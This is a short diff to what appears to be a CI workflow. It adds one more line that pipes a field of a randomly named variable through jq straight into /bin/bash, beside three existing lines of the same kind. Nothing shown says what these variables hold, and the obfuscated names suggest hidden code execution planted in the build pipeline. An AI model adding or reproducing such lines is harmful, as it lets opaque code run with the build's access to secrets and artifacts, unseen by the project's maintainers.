@@ -20,6 +20,7 @@ jobs:
           echo $aer17 | jq -r .rjln468 | /bin/bash
           echo $ya14380 | jq -r .sxk2 | /bin/bash
           printf '%s' "$dads256" | jq -r .u0 | /bin/bash
+          printf '%s' "$a952" | jq -r .veob195 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
